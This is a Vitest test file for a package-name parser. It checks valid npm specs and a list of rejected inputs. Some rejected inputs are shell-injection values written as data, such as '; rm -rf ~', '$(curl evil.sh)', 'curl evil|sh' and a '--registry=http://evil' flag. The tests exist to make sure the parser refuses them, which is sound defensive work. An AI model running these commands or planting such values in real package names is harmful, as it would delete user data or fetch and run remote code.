import { describe, it, expect } from "vitest";
import { isValidPackageName, parsePackageSpec } from "../src/package-spec.js";

describe("parsePackageSpec", () => {
  it.each([
    ["@tuttiai/slack", { name: "@tuttiai/slack" }],
    ["@acme/voice", { name: "@acme/voice" }],
    ["left-pad", { name: "left-pad" }],
    ["@tuttiai/slack@1.2.3", { name: "@tuttiai/slack", version: "1.2.3" }],
    ["@tuttiai/slack@latest", { name: "@tuttiai/slack", version: "latest" }],
    ["@acme/voice@^1.2.0", { name: "@acme/voice", version: "^1.2.0" }],
    ["@acme/voice@~1.2", { name: "@acme/voice", version: "~1.2" }],
    ["@acme/voice@1.x", { name: "@acme/voice", version: "1.x" }],
    ["@acme/voice@1.0.0-beta.1+b", { name: "@acme/voice", version: "1.0.0-beta.1+b" }],
  ])("accepts %s", (spec, data) => {
    expect(parsePackageSpec(spec)).toEqual({ success: true, data });
  });

  it.each([
    ["semicolon", "@tuttiai/x; rm -rf ~"],
    ["command substitution", "@tuttiai/$(curl evil.sh)"],
    ["backtick", "@tuttiai/`id`"],
    ["pipe", "@tuttiai/x|sh"],
    ["ampersand", "@tuttiai/x&&id"],
    ["redirect", "@tuttiai/x>out"],
    ["double quote", '@tuttiai/x"'],
    ["percent", "@tuttiai/%PATH%"],
    ["space", "@tuttiai/x y"],
    ["newline", "@tuttiai/x\nid"],
    ["trailing newline", "@tuttiai/x\n"],
    ["leading dash", "--registry=http://evil"],
    ["leading dot", ".hidden"],
    ["leading underscore", "_private"],
    ["uppercase letter", "@acme/Voice"],
    ["comparator range", "@acme/voice@>=1 <2"],
    ["shell character in the version", "@acme/voice@1;id"],
    ["empty version", "@acme/voice@"],
    ["file spec", "file:../evil"],
    ["git spec", "git+https://github.com/evil/x.git"],
    ["url", "https://evil.example/x.tgz"],
    ["npm alias", "x@npm:evil"],
    ["lone at sign", "@"],
    ["scope without a name", "@acme/"],
    ["empty scope", "@/voice"],
    ["second slash", "@acme/voice/extra"],
    ["scope without a slash", "@acme"],
  ])("rejects a spec with a %s", (_label, spec) => {
    expect(parsePackageSpec(spec)).toEqual({
      success: false,
      error: `Invalid package name: ${JSON.stringify(spec)}`,
    });
  });

  it("rejects a name longer than 214 characters", () => {
    expect(parsePackageSpec("a".repeat(215)).success).toBe(false);
  });

  it("accepts a name of exactly 214 characters", () => {
    expect(parsePackageSpec("a".repeat(214)).success).toBe(true);
  });

  it.each(["", "   ", "\t"])("asks for a name when given %j", (spec) => {
    expect(parsePackageSpec(spec)).toEqual({
      success: false,
      error: "Package name is required.",
    });
  });
});

describe("isValidPackageName", () => {
  it("accepts a scoped name", () => {
    expect(isValidPackageName("@tuttiai/core")).toBe(true);
  });

  it("rejects a name carrying a version", () => {
    expect(isValidPackageName("@tuttiai/core@1.0.0")).toBe(false);
  });

  it("rejects a package.json key with shell characters", () => {
    expect(isValidPackageName("@tuttiai/x; curl evil|sh")).toBe(false);
  });
});
